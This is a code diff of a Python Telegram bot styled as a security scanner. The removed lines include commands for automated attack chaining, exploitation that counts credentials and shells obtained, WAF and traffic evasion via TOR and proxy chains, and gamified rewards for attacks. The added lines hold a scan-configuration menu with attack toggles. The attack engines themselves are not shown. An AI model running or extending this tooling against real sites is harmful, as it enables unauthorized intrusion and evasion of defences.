-        """Show reports and analytics menu"""
-        keyboard = [
-            [
-                InlineKeyboardButton("📊 Executive Summary", callback_data="reports_executive"),
-                InlineKeyboardButton("📈 Detailed Report", callback_data="reports_detailed")
-            ],
-            [
-                InlineKeyboardButton("⏱️ Attack Timeline", callback_data="reports_timeline"),
-                InlineKeyboardButton("🗺️ Risk Heat Map", callback_data="reports_heatmap")
-            ],
-            [
-                InlineKeyboardButton("📋 Compliance Report", callback_data="reports_compliance"),
-                InlineKeyboardButton("📧 Email Report", callback_data="reports_email")
-            ],
-            [
-                InlineKeyboardButton("📱 Mobile Dashboard", callback_data="reports_mobile"),
-                InlineKeyboardButton("🔄 Live Monitoring", callback_data="reports_live")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-📊 **Enhanced Reporting & Visualization**
-
-Comprehensive security reporting and analytics:
-
-📊 **Executive Summary** - High-level security overview for management
-📈 **Detailed Report** - Technical vulnerability analysis
-⏱️ **Attack Timeline** - Interactive visual attack progression
-🗺️ **Risk Heat Map** - Geographic and network vulnerability visualization
-📋 **Compliance Report** - OWASP Top 10, NIST, ISO 27001 mapping
-📧 **Email Report** - Automated scheduled reports via email
-📱 **Mobile Dashboard** - Mobile-optimized security dashboard
-🔄 **Live Monitoring** - Real-time security status updates
-
-**Report Features:**
-✅ NLP-powered executive summaries
-✅ Interactive visualizations
-✅ Risk prioritization matrices
-✅ Compliance gap analysis
-✅ Remediation roadmaps
-✅ ROI security metrics
-
-Select a reporting option:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_cloud_menu(self, query):
-        """Show enhanced cloud security options"""
-        keyboard = [
-            [
-                InlineKeyboardButton("☁️ AWS Security Audit", callback_data="cloud_aws_audit"),
-                InlineKeyboardButton("🌐 Azure Assessment", callback_data="cloud_azure_audit")
-            ],
-            [
-                InlineKeyboardButton("🔍 GCP Security Scan", callback_data="cloud_gcp_audit"),
-                InlineKeyboardButton("📦 Container Analysis", callback_data="cloud_container")
-            ],
-            [
-                InlineKeyboardButton("⚙️ Kubernetes Audit", callback_data="cloud_k8s_audit"),
-                InlineKeyboardButton("🗄️ S3 Bucket Hunter", callback_data="cloud_s3_hunter")
-            ],
-            [
-                InlineKeyboardButton("🔒 IAM Analysis", callback_data="cloud_iam"),
-                InlineKeyboardButton("📊 Cloud Asset Discovery", callback_data="cloud_discovery")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-🌐 **Cloud Security Assessment Suite**
-
-Comprehensive cloud infrastructure security testing:
-
-☁️ **AWS Security Audit** - EC2, S3, IAM, Lambda comprehensive analysis
-🌐 **Azure Assessment** - ARM templates, Storage, AD security review
-🔍 **GCP Security Scan** - Compute Engine, Cloud Storage, IAM audit
-📦 **Container Analysis** - Docker security scanning and analysis
-⚙️ **Kubernetes Audit** - Cluster configuration and workload security
-🗄️ **S3 Bucket Hunter** - Open storage bucket discovery
-🔒 **IAM Analysis** - Identity and access management review
-📊 **Cloud Asset Discovery** - Multi-cloud asset enumeration
-
-**Cloud Attack Vectors:**
-• Misconfigured permissions and policies
-• Open storage buckets and containers
-• Weak IAM configurations
-• Container escape vulnerabilities
-• Serverless function security issues
-• API gateway misconfigurations
-
-**Supported Cloud Providers:**
-✅ Amazon Web Services (AWS)
-✅ Microsoft Azure
-✅ Google Cloud Platform (GCP)
-✅ DigitalOcean
-✅ Alibaba Cloud
-
-Select your cloud security assessment:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_mobile_menu(self, query):
-        """Show enhanced mobile security options"""
-        keyboard = [
-            [
-                InlineKeyboardButton("📱 APK Deep Analysis", callback_data="mobile_apk_deep"),
-                InlineKeyboardButton("🍎 iOS Security Audit", callback_data="mobile_ios_audit")
-            ],
-            [
-                InlineKeyboardButton("🔓 App Decompilation", callback_data="mobile_decompile"),
-                InlineKeyboardButton("🔍 Static Code Analysis", callback_data="mobile_static")
-            ],
-            [
-                InlineKeyboardButton("⚡ Dynamic Testing", callback_data="mobile_dynamic"),
-                InlineKeyboardButton("🌐 Mobile API Testing", callback_data="mobile_api")
-            ],
-            [
-                InlineKeyboardButton("🔐 Crypto Analysis", callback_data="mobile_crypto"),
-                InlineKeyboardButton("🛡️ Anti-Debug Bypass", callback_data="mobile_debug")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-📱 **Mobile Security Analysis Suite**
-
-Comprehensive mobile application security testing:
-
-📱 **APK Deep Analysis** - Android package comprehensive security audit
-🍎 **iOS Security Audit** - iPhone/iPad application assessment
-🔓 **App Decompilation** - Reverse engineering and code analysis
-🔍 **Static Code Analysis** - Source code vulnerability detection
-⚡ **Dynamic Testing** - Runtime behavior and interaction analysis
-🌐 **Mobile API Testing** - Backend API security assessment
-🔐 **Crypto Analysis** - Cryptographic implementation review
-🛡️ **Anti-Debug Bypass** - Anti-tampering and debugging evasion
-
-**Mobile Security Features:**
-✅ Permission analysis and privacy assessment
-✅ Hardcoded secrets and API key detection
-✅ SSL pinning bypass techniques
-✅ Root/jailbreak detection evasion
-✅ Binary protection analysis
-✅ Data storage security review
-✅ Network communication analysis
-✅ WebView security assessment
-
-**Supported Platforms:**
-🤖 Android (APK, AAB)
-🍎 iOS (IPA)
-⚛️ React Native
-📱 Flutter
-🌐 Cordova/PhoneGap
-
-Upload your mobile app or provide download link:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def attack_chaining_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Execute attack chaining with AI automation"""
-        if not context.args:
-            await update.message.reply_text(
-                "❌ Please provide a URL for attack chaining.\n"
-                "Usage: `/attack_chain https://example.com`\n"
-                "Advanced: `/attack_chain https://example.com --ai --evasion`",
-                parse_mode='Markdown'
-            )
+        if user_id not in self.user_sessions:
+            await query.edit_message_text("❌ Session expired. Please start again with /config")
             return
 
-        target_url = context.args[0]
-        options = context.args[1:] if len(context.args) > 1 else []
+        config = self.user_sessions[user_id]['config']
 
-        # Parse advanced options
-        use_ai = '--ai' in options
-        use_evasion = '--evasion' in options
-        use_zeroday = '--zeroday' in options
-
-        if not target_url.startswith(('http://', 'https://')):
-            target_url = 'https://' + target_url
-
-        # Start progress tracking
-        message_id = await telegram_progress.start_progress_message(update, context, "Advanced Attack Chaining Sequence")
-
-        try:
-            user_id = update.effective_user.id
-
-            # Phase 1: Enhanced vulnerability discovery
-            await telegram_progress.update_progress(message_id, 10, "🔍 Discovering vulnerabilities with AI assistance...")
-            scanner = ComprehensiveScanner(target_url)
-            scanner.scan_web_vulnerabilities(aggressive=True)
-            vulnerabilities = scanner.get_results()['vulnerabilities']
-
-            if not vulnerabilities:
-                await telegram_progress.complete_progress(message_id, {"error": "No vulnerabilities found for chaining"})
-                return
-
-            # Phase 2: AI-powered attack automation
-            await telegram_progress.update_progress(message_id, 25, "🤖 Initializing AI attack automation...")
-            if use_ai:
-                automation_engine = AdvancedAttackAutomation(target_url, vulnerabilities)
-                ai_results = await automation_engine.execute_smart_attack_sequence()
-            else:
-                ai_results = {}
-
-            # Phase 3: Zero-day simulation
-            if use_zeroday:
-                await telegram_progress.update_progress(message_id, 40, "🕳️ Running zero-day simulation...")
-                technologies = scanner.get_results().get('technologies', [])
-                zero_day_engine = ZeroDaySimulationEngine(technologies)
-                zero_day_results = await zero_day_engine.simulate_unknown_vulnerabilities()
-                ai_results['zero_day_findings'] = zero_day_results
-
-            # Phase 4: Attack chain execution
-            await telegram_progress.update_progress(message_id, 55, "⛓️ Executing intelligent attack chains...")
-            chain_engine = AttackChainingEngine(target_url, vulnerabilities)
-            chain_analysis = chain_engine.analyze_vulnerability_chains()
-            chain_results = chain_engine.execute_all_available_chains()
-
-            # Phase 5: WAF bypass and evasion
-            if use_evasion:
-                await telegram_progress.update_progress(message_id, 75, "🌊 Applying advanced evasion techniques...")
-                # Apply WAF bypass techniques to failed attacks
-                for failed_attack in chain_results.get('chain_results', []):
-                    if not failed_attack['success']:
-                        # Retry with evasion
-                        pass
-
-            # Phase 6: Final results compilation
-            await telegram_progress.update_progress(message_id, 90, "📊 Compiling comprehensive results...")
-
-            # Combine all results
-            final_results = {
-                'total_attacks': chain_results.get('total_chains', 0) + len(ai_results.get('attack_timeline', [])),
-                'successful_exploits': chain_results.get('successful_chains', 0) + ai_results.get('successful_exploits', 0),
-                'credentials_found': chain_results.get('extracted_data_summary', {}).get('credentials', 0),
-                'shells_obtained': ai_results.get('shells_obtained', []) + chain_results.get('extracted_data_summary', {}).get('sessions', 0),
-                'ai_features_used': use_ai,
-                'evasion_applied': use_evasion,
-                'zero_day_tested': use_zeroday,
-                'attack_chains': chain_results,
-                'ai_automation': ai_results,
-                'objectives_achieved': chain_results.get('objectives_achieved', [])
-            }
-
-            # Award achievements
-            await self._award_achievement(user_id, "chain_master", "Executed advanced attack chain")
-            if use_ai:
-                await self._award_achievement(user_id, "ai_warrior", "Used AI-powered attacks")
-
-            # Update user stats
-            self.user_stats[user_id]['attacks_executed'] += final_results['total_attacks']
-            self.user_stats[user_id]['experience'] += final_results['successful_exploits'] * 10
-
-            await telegram_progress.complete_progress(message_id, final_results)
-
-            # Send comprehensive attack chain report
-            await self._send_attack_chain_report(update, final_results, target_url)
-
-        except Exception as e:
-            await telegram_progress.complete_progress(message_id, {"error": str(e)})
-
-    async def zero_day_simulation_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Execute zero-day vulnerability simulation"""
-        if not context.args:
-            await update.message.reply_text(
-                "❌ Please provide target technologies for zero-day simulation.\n"
-                "Usage: `/zeroday_sim WordPress,Apache,MySQL`\n"
-                "Or: `/zeroday_sim https://example.com` (auto-detect)",
-                parse_mode='Markdown'
-            )
+        if data == "toggle_aggressive":
+            config['aggressive'] = not config['aggressive']
+        elif data == "toggle_ports":
+            config['include_ports'] = not config['include_ports']
+        elif data == "toggle_ssl":
+            config['include_ssl'] = not config['include_ssl']
+        elif data == "toggle_dns":
+            config['include_dns'] = not config['include_dns']
+        elif data == "toggle_autofix":
+            config['auto_fix'] = not config['auto_fix']
+        elif data == "toggle_attack":
+            config['attack_mode'] = not config['attack_mode']
+        elif data == "toggle_vps":
+            config['vps_attack'] = not config['vps_attack']
+        elif data == "set_pages":
+            # Cycle through page options
+            config['max_pages'] = 1 if config['max_pages'] >= 10 else config['max_pages'] + 1
+        elif data == "save_config":
+            await query.edit_message_text("✅ Configuration saved! Use /scan to start scanning.")
+            return
+        elif data.startswith("payload_"):
+            await self._handle_payload_selection(query, data)
             return
 
-        target = context.args[0]
-        
-        await update.message.reply_text("🕳️ **Zero-Day Simulation Engine** - Starting ML-based vulnerability discovery...")
+        # Update the configuration display
+        keyboard = [
+            [
+                InlineKeyboardButton(f"Aggressive Scan: {'✅' if config['aggressive'] else '❌'}", callback_data="toggle_aggressive"),
+                InlineKeyboardButton(f"Port Scanning: {'✅' if config['include_ports'] else '❌'}", callback_data="toggle_ports")
+            ],
+            [
+                InlineKeyboardButton(f"SSL/TLS Check: {'✅' if config['include_ssl'] else '❌'}", callback_data="toggle_ssl"),
+                InlineKeyboardButton(f"DNS Analysis: {'✅' if config['include_dns'] else '❌'}", callback_data="toggle_dns")
+            ],
+            [
+                InlineKeyboardButton(f"Auto-Fix: {'✅' if config['auto_fix'] else '❌'}", callback_data="toggle_autofix"),
+                InlineKeyboardButton(f"Attack Mode: {'✅' if config['attack_mode'] else '❌'}", callback_data="toggle_attack")
+            ],
+            [
+                InlineKeyboardButton(f"VPS/VDS Attack: {'✅' if config['vps_attack'] else '❌'}", callback_data="toggle_vps"),
+                InlineKeyboardButton(f"Max Pages: {config['max_pages']}", callback_data="set_pages")
+            ],
+            [
+                InlineKeyboardButton("✅ Save Configuration", callback_data="save_config")
+            ]
+        ]
 
-        try:
-            if target.startswith(('http://', 'https://')):
-                # Auto-detect technologies
-                scanner = ComprehensiveScanner(target)
-                scanner.detect_cms_and_technologies()
-                technologies = scanner.get_results().get('technologies', [])
-            else:
-                # Manual technology specification
-                technologies = [tech.strip() for tech in target.split(',')]
+        reply_markup = InlineKeyboardMarkup(keyboard)
 
-            zero_day_engine = ZeroDaySimulationEngine(technologies)
-            simulated_vulns = await zero_day_engine.simulate_unknown_vulnerabilities()
+        config_text = f"""
+⚙️ **Scan Configuration**
 
-            report = f"""
-🕳️ **Zero-Day Simulation Results**
+Current Settings:
+• Aggressive Scanning: {'Enabled' if config['aggressive'] else 'Disabled'}
+• Port Scanning: {'Enabled' if config['include_ports'] else 'Disabled'}
+• SSL/TLS Analysis: {'Enabled' if config['include_ssl'] else 'Disabled'}
+• DNS Vulnerability Check: {'Enabled' if config['include_dns'] else 'Disabled'}
+• Auto-Remediation: {'Enabled' if config['auto_fix'] else 'Disabled'}
+• Interactive Attack Mode: {'Enabled' if config['attack_mode'] else 'Disabled'}
+• VPS/VDS Attacks: {'Enabled' if config['vps_attack'] else 'Disabled'}
+• Maximum Pages to Scan: {config['max_pages']}
 
-🎯 **Target Technologies:** {', '.join(technologies)}
-🔍 **Simulated Vulnerabilities:** {len(simulated_vulns)}
+Tap buttons below to toggle settings:
+        """
 
-**Potential Zero-Day Findings:**
-"""
-
-            for i, vuln in enumerate(simulated_vulns[:5], 1):
-                confidence = vuln.get('confidence', 0) * 100
-                report += f"\n{i}. **{vuln['type']}**\n"
-                report += f"   Severity: {vuln['severity']}\n"
-                report += f"   Confidence: {confidence:.1f}%\n"
-                report += f"   Pattern: {vuln['ml_pattern']}\n"
-
-            report += f"\n⚠️ **Note:** These are simulated findings based on ML patterns. Actual exploitation requires further validation."
-
-            await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-
-        except Exception as e:
-            await update.message.reply_text(f"❌ Zero-day simulation failed: {str(e)}")
-
-    async def compliance_check_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Perform compliance mapping check"""
-        if not context.args:
-            await update.message.reply_text(
-                "❌ Please provide a URL for compliance checking.\n"
-                "Usage: `/compliance https://example.com`\n"
-                "Standards: `/compliance https://example.com --owasp --nist --iso27001`",
-                parse_mode='Markdown'
-            )
-            return
-
-        target_url = context.args[0]
-        standards = context.args[1:] if len(context.args) > 1 else ['--owasp']
-
-        await update.message.reply_text(f"📊 **Compliance Mapping Analysis** - Checking {target_url} against security standards...")
-
-        try:
-            # Perform comprehensive scan first
-            scanner = ComprehensiveScanner(target_url)
-            scanner.scan_web_vulnerabilities(aggressive=True)
-            scanner.check_security_headers()
-            scanner.scan_ssl_tls()
-            results = scanner.get_results()
-
-            compliance_results = self.compliance_checker.check_compliance(results, standards)
-
-            report = f"""
-📊 **Security Compliance Report**
-
-🎯 **Target:** {target_url}
-📋 **Standards Checked:** {', '.join([s.replace('--', '').upper() for s in standards])}
-
-**OWASP Top 10 Compliance:**
-"""
-
-            for finding in compliance_results.get('owasp_top10', []):
-                status = "✅ COMPLIANT" if finding['compliant'] else "❌ NON-COMPLIANT"
-                report += f"• {finding['category']}: {status}\n"
-
-            if '--nist' in standards:
-                report += "\n**NIST Cybersecurity Framework:**\n"
-                for control in compliance_results.get('nist', []):
-                    status = "✅ IMPLEMENTED" if control['implemented'] else "❌ MISSING"
-                    report += f"• {control['control']}: {status}\n"
-
-            if '--iso27001' in standards:
-                report += "\n**ISO 27001 Controls:**\n"
-                for control in compliance_results.get('iso27001', []):
-                    status = "✅ ADEQUATE" if control['adequate'] else "❌ INADEQUATE"
-                    report += f"• {control['control']}: {status}\n"
-
-            # Overall compliance score
-            total_checks = len(compliance_results.get('owasp_top10', [])) + len(compliance_results.get('nist', [])) + len(compliance_results.get('iso27001', []))
-            compliant_checks = sum(1 for finding in compliance_results.get('owasp_top10', []) if finding['compliant'])
-            compliant_checks += sum(1 for control in compliance_results.get('nist', []) if control['implemented'])
-            compliant_checks += sum(1 for control in compliance_results.get('iso27001', []) if control['adequate'])
-
-            compliance_score = (compliant_checks / max(total_checks, 1)) * 100
-
-            report += f"\n📈 **Overall Compliance Score:** {compliance_score:.1f}%"
-
-            await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-
-        except Exception as e:
-            await update.message.reply_text(f"❌ Compliance check failed: {str(e)}")
-
-    async def _award_achievement(self, user_id: int, achievement_id: str, description: str):
-        """Award achievement to user"""
-        if user_id not in self.user_achievements:
-            self.user_achievements[user_id] = []
-
-        if achievement_id not in self.user_achievements[user_id]:
-            self.user_achievements[user_id].append(achievement_id)
-            self.user_stats[user_id]['achievements'].append({
-                'id': achievement_id,
-                'description': description,
-                'earned_at': datetime.now().isoformat()
-            })
-            self.user_stats[user_id]['experience'] += 50  # Bonus XP for achievement
-
-    async def _send_attack_chain_report(self, update: Update, results: Dict[str, Any], target_url: str):
-        """Send comprehensive attack chain report"""
-        report = f"""
-⛓️ **Advanced Attack Chain Report**
-
-🎯 **Target:** {target_url}
-🤖 **AI Features:** {'✅ Enabled' if results.get('ai_features_used') else '❌ Disabled'}
-🌊 **Evasion Techniques:** {'✅ Applied' if results.get('evasion_applied') else '❌ Not used'}
-🕳️ **Zero-Day Testing:** {'✅ Executed' if results.get('zero_day_tested') else '❌ Skipped'}
-
-📊 **Attack Statistics:**
-🚀 **Total Attack Chains:** {results.get('total_attacks', 0)}
-✅ **Successful Chains:** {results.get('successful_exploits', 0)}
-🔑 **Credentials Found:** {results.get('credentials_found', 0)}
-🐚 **Shells Obtained:** {len(results.get('shells_obtained', []))}
-
-🏆 **Objectives Achieved:**
-"""
-
-        for objective in results.get('objectives_achieved', [])[:5]:
-            report += f"• {objective}\n"
-
-        if results.get('ai_automation'):
-            ai_stats = results['ai_automation']
-            report += f"""
-🤖 **AI Automation Results:**
-⚡ **Smart Attacks:** {ai_stats.get('total_attacks', 0)}
-🎯 **AI Success Rate:** {(ai_stats.get('successful_exploits', 0) / max(ai_stats.get('total_attacks', 1), 1) * 100):.1f}%
-🔗 **Persistence Mechanisms:** {len(ai_stats.get('persistence_mechanisms', []))}
-💾 **Data Extracted:** {len(ai_stats.get('extracted_data', []))} items
-"""
-
-        await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-
-    async def _handle_specific_callbacks(self, query, data):
-        """Handle specific callback actions for all features"""
-        if data.startswith('ai_'):
-            await self._handle_ai_callbacks(query, data)
-        elif data.startswith('evasion_'):
-            await self._handle_evasion_callbacks(query, data)
-        elif data.startswith('api_'):
-            await self._handle_api_callbacks(query, data)
-        elif data.startswith('achievements_'):
-            await self._handle_achievement_callbacks(query, data)
-        elif data.startswith('ctf_'):
-            await self._handle_ctf_callbacks(query, data)
-        elif data.startswith('cloud_'):
-            await self._handle_cloud_callbacks(query, data)
-        elif data.startswith('mobile_'):
-            await self._handle_mobile_callbacks(query, data)
-        elif data.startswith('remediation_'):
-            await self._handle_remediation_callbacks(query, data)
-        elif data.startswith('reports_'):
-            await self._handle_reports_callbacks(query, data)
-        else:
-            await query.edit_message_text(f"🔧 Feature '{data}' is being implemented with advanced capabilities...")
-
-    async def _handle_ai_callbacks(self, query, data):
-        """Handle AI feature callbacks"""
-        responses = {
-            'ai_payloads': "🤖 **Smart Payload Generation** activated!\n\nAI is analyzing target responses and adapting payloads in real-time. Machine learning models are optimizing attack vectors based on success patterns.",
-            'ai_correlation': "🧠 **Vulnerability Correlation Engine** active!\n\nML algorithms are identifying complex attack patterns and vulnerability relationships. Cross-referencing with threat intelligence databases.",
-            'ai_reports': "📝 **Auto Reporting with NLP** enabled!\n\nGenerating executive summaries using natural language processing. Reports are being tailored for technical and non-technical audiences.",
-            'ai_threat_intel': "🔍 **Threat Intelligence Integration** connected!\n\nReal-time CVE feeds active. Correlating findings with latest threat actor TTPs and IOCs from global security feeds.",
-            'ai_zeroday': "🕳️ **Zero-Day Simulation** running!\n\nMachine learning patterns analyzing target for potential unknown vulnerabilities. Behavioral analysis detecting anomalous responses.",
-            'ai_ml_patterns': "📊 **ML Pattern Analysis** processing!\n\nAdvanced behavioral analysis identifying security weaknesses through pattern recognition and anomaly detection algorithms."
-        }
-        
-        await query.edit_message_text(responses.get(data, "🤖 AI feature activated!"), parse_mode=ParseMode.MARKDOWN)
-
-    async def _handle_evasion_callbacks(self, query, data):
-        """Handle evasion technique callbacks"""
-        responses = {
-            'evasion_waf': "🌊 **WAF Bypass Engine** engaged!\n\nAutomated Web Application Firewall evasion techniques active:\n• SQL injection encoding variations\n• XSS filter bypasses\n• Rate limiting evasion\n• Signature obfuscation",
-            'evasion_traffic': "🎭 **Traffic Obfuscation** enabled!\n\nRandomizing request patterns:\n• User agent rotation (25 variants)\n• Request timing randomization\n• Header order manipulation\n• Payload encoding variations",
-            'evasion_proxy': "🔗 **Proxy Chain Support** activated!\n\nRouting attacks through multiple proxy layers:\n• TOR network integration\n• SOCKS5 proxy chains\n• HTTP proxy rotation\n• Geographic distribution",
-            'evasion_timing': "⏰ **Timing Randomization** active!\n\nHuman-like request patterns:\n• Random delays (1-15 seconds)\n• Burst pattern avoidance\n• Session simulation\n• Natural browsing behavior",
-            'evasion_useragent': "🕵️ **User Agent Rotation** running!\n\nCycling through realistic browser profiles:\n• Chrome, Firefox, Safari variants\n• Mobile device simulation\n• Bot detection avoidance\n• Version randomization",
-            'evasion_request': "🔄 **Request Obfuscation** applied!\n\nAdvanced payload encoding:\n• Base64 variations\n• URL encoding chains\n• Unicode normalization\n• Character set manipulation"
-        }
-        
-        await query.edit_message_text(responses.get(data, "🔒 Evasion technique activated!"), parse_mode=ParseMode.MARKDOWN)
-
-    # Add help command for all new features
-    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Enhanced scan command with comprehensive vulnerability assessment"""
-        if not context.args:
-            await update.message.reply_text(
-                "❌ Please provide a URL to scan.\n"
-                "Usage: `/scan https://example.com`\n"
-                "Advanced: `/scan https://example.com --aggressive --ai`",
-                parse_mode='Markdown'
-            )
-            return
-
-        target_url = context.args[0]
-        options = context.args[1:] if len(context.args) > 1 else []
-
-        if not target_url.startswith(('http://', 'https://')):
-            target_url = 'https://' + target_url
-
-        await update.message.reply_text(f"🔍 **Starting comprehensive scan of {target_url}**\n\nThis may take a few minutes...")
-
-        try:
-            user_id = update.effective_user.id
-            
-            # Initialize scanner with enhanced features
-            scanner = ComprehensiveScanner(target_url)
-            
-            # Perform comprehensive scan
-            scanner.scan_web_vulnerabilities(aggressive='--aggressive' in options)
-            scanner.check_security_headers()
-            scanner.scan_ssl_tls()
-            scanner.detect_cms_and_technologies()
-            
-            results = scanner.get_results()
-            
-            # Update user stats
-            self.user_stats[user_id]['scans_performed'] += 1
-            self.user_stats[user_id]['vulnerabilities_found'] += len(results.get('vulnerabilities', []))
-            self.user_stats[user_id]['experience'] += 10
-            
-            # Generate scan report
-            report = f"""
-🔍 **Security Scan Results for {target_url}**
-
-📊 **Summary:**
-🔴 Critical: {len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'Critical'])}
-🟡 High: {len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'High'])}
-🟢 Medium: {len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'Medium'])}
-🔵 Low: {len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'Low'])}
-
-**🔍 Vulnerabilities Found:**
-"""
-
-            for vuln in results.get('vulnerabilities', [])[:5]:
-                report += f"• **{vuln.get('type', 'Unknown')}** ({vuln.get('severity', 'Unknown')})\n"
-                report += f"  Location: {vuln.get('location', 'N/A')}\n"
-
-            if len(results.get('vulnerabilities', [])) > 5:
-                report += f"\n... and {len(results.get('vulnerabilities', [])) - 5} more vulnerabilities"
-
-            await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-
-        except Exception as e:
-            await update.message.reply_text(f"❌ Scan failed: {str(e)}")
-
-    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Execute smart vulnerability exploitation"""
-        if not context.args:
-            await update.message.reply_text(
-                "❌ Please provide a URL for attack execution.\n"
-                "Usage: `/attack https://example.com`\n"
-                "Advanced: `/attack https://example.com --stealth --ai`",
-                parse_mode='Markdown'
-            )
-            return
-
-        target_url = context.args[0]
-        options = context.args[1:] if len(context.args) > 1 else []
-
-        if not target_url.startswith(('http://', 'https://')):
-            target_url = 'https://' + target_url
-
-        await update.message.reply_text(f"⚔️ **Starting attack execution on {target_url}**\n\n⚠️ Ensure you have authorization!")
-
-        try:
-            user_id = update.effective_user.id
-            
-            # First scan for vulnerabilities
-            scanner = ComprehensiveScanner(target_url)
-            scanner.scan_web_vulnerabilities(aggressive=True)
-            vulnerabilities = scanner.get_results()['vulnerabilities']
-            
-            if not vulnerabilities:
-                await update.message.reply_text("❌ No exploitable vulnerabilities found for attack execution.")
-                return
-            
-            # Execute attacks
-            attack_engine = AttackEngine(target_url)
-            attack_results = attack_engine.execute_attacks(vulnerabilities)
-            
-            # Update user stats
-            self.user_stats[user_id]['attacks_executed'] += 1
-            self.user_stats[user_id]['experience'] += 20
-            
-            # Generate attack report
-            report = f"""
-⚔️ **Attack Execution Results**
-
-🎯 **Target:** {target_url}
-🚀 **Attacks Executed:** {attack_results.get('total_attacks', 0)}
-✅ **Successful Exploits:** {attack_results.get('successful_exploits', 0)}
-❌ **Failed Attempts:** {attack_results.get('failed_exploits', 0)}
-
-**🔓 Successful Exploitations:**
-"""
-            
-            for success in attack_results.get('successful_attacks', [])[:3]:
-                report += f"• {success.get('type', 'Unknown')} at {success.get('location', 'N/A')}\n"
-            
-            await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-            
-        except Exception as e:
-            await update.message.reply_text(f"❌ Attack execution failed: {str(e)}")
+        await query.edit_message_text(config_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle text messages and provide assistance"""
-        message_text = update.message.text.lower()
-        
-        if any(keyword in message_text for keyword in ['help', 'commands', 'what can you do']):
-            await self.help_command(update, context)
-        elif any(keyword in message_text for keyword in ['scan', 'test', 'check']):
-            await update.message.reply_text(
-                "🔍 To scan a website, use:\n`/scan https://example.com`\n\n"
-                "For more commands, type `/help`",
-                parse_mode='Markdown'
-            )
-        elif any(keyword in message_text for keyword in ['attack', 'exploit', 'hack']):
-            await update.message.reply_text(
-                "⚔️ To execute attacks, use:\n`/attack https://example.com`\n\n"
-                "⚠️ Only use on authorized targets!\n"
-                "For more commands, type `/help`",
-                parse_mode='Markdown'
-            )
-        else:
-            await update.message.reply_text(
-                "👋 Hello! I'm your advanced security scanner bot.\n\n"
-                "🔍 Use `/scan <url>` to scan for vulnerabilities\n"
-                "⚔️ Use `/attack <url>` to exploit found vulnerabilities\n"
-                "❓ Use `/help` for complete command reference\n\n"
-                "⚠️ **Legal Notice:** Only use on authorized targets!"
-            )
+        """Handle text messages"""
+        user_id = update.effective_user.id
+        message_text = update.message.text
 
-    async def _handle_api_callbacks(self, query, data):
-        """Handle API testing callbacks"""
-        responses = {
-            'api_discovery': "📡 **API Discovery** initiated!\n\nScanning for REST/GraphQL endpoints:\n• Automated endpoint enumeration\n• Parameter discovery\n• Authentication analysis",
-            'api_fuzzing': "🔍 **Endpoint Fuzzing** active!\n\nFuzzing discovered endpoints:\n• Parameter pollution testing\n• Method tampering\n• Input validation bypass",
-            'api_rest': "🌐 **REST API Testing** running!\n\nTesting RESTful services:\n• Authentication bypass\n• Authorization flaws\n• Data exposure issues",
-            'api_graphql': "📊 **GraphQL Testing** executing!\n\nAnalyzing GraphQL implementations:\n• Query injection\n• Introspection abuse\n• Depth limit bypass",
-            'api_websocket': "🔌 **WebSocket Testing** active!\n\nReal-time protocol analysis:\n• Connection hijacking\n• Message injection\n• Authentication bypass",
-            'api_auth': "🔑 **Auth Bypass Tests** running!\n\nTesting authentication mechanisms:\n• JWT token analysis\n• Session management flaws\n• OAuth vulnerabilities"
-        }
-        
-        await query.edit_message_text(responses.get(data, "📡 API testing feature activated!"), parse_mode=ParseMode.MARKDOWN)
+        if user_id not in self.user_sessions:
+            await update.message.reply_text(
+                "Please start with /scan command to begin a vulnerability scan."
+            )
+            return
 
-    async def _handle_achievement_callbacks(self, query, data):
-        """Handle achievement system callbacks"""
-        user_id = query.from_user.id
-        user_stats = self.user_stats.get(user_id, {})
-        
-        if data == 'achievements_view':
-            achievements_text = f"""
-🏆 **Your Achievements**
+        session = self.user_sessions[user_id]
 
-**Earned Badges:**
+        if session['step'] == 'target':
+            # Validate URL
+            target_url = message_text.strip()
+
+            if not target_url.startswith(('http://', 'https://')):
+                await update.message.reply_text(
+                    "❌ Please provide a valid URL starting with http:// or https://"
+                )
+                return
+
+            # Start the scan
+            session['target_url'] = target_url
+            self.active_scans[user_id] = True
+
+            await self.start_vulnerability_scan(update, context, target_url, session['config'])
+
+    async def start_vulnerability_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_url: str, config: Dict):
+        """Start the vulnerability scanning process"""
+        user_id = update.effective_user.id
+
+        # Initialize scan results storage
+        if not hasattr(self, 'last_scan_results'):
+            self.last_scan_results = {}
+
+        progress_message = await update.message.reply_text(
+            f"🔍 **Starting Vulnerability Scan**\n\n"
+            f"Target: `{target_url}`\n"
+            f"Status: Initializing scanner...\n"
